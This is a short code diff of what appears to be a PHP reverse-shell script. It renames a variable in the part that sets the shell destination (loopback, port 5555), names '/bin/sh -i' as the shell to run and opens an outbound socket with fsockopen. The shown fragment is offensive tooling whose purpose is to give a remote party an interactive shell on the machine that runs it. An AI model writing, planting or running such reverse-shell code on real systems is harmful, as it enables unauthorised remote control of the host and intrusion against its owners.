@@ -2,7 +2,7 @@
 
     // CHANGE THE FOLLOWING PARAMS AS NEEDED:
     //---------------------------------------------------------------
-    $host = '127.0.0.1';   # shell destination (loopback for testing)
+    $addr = '127.0.0.1';   # shell destination (loopback for testing)
     $port = 5555;          # shell destination port
     $timeout = 20.0;       # connection timeout time (seconds):
     $shell = '/bin/sh -i'; # shell to run
@@ -10,7 +10,7 @@
 
 
     // open a socket to connect to host
-    $socket = fsockopen($host, $port, $errno, $errstr, $timeout);
+    $socket = fsockopen($addr, $port, $errno, $errstr, $timeout);
 
 
     // check if connection successful
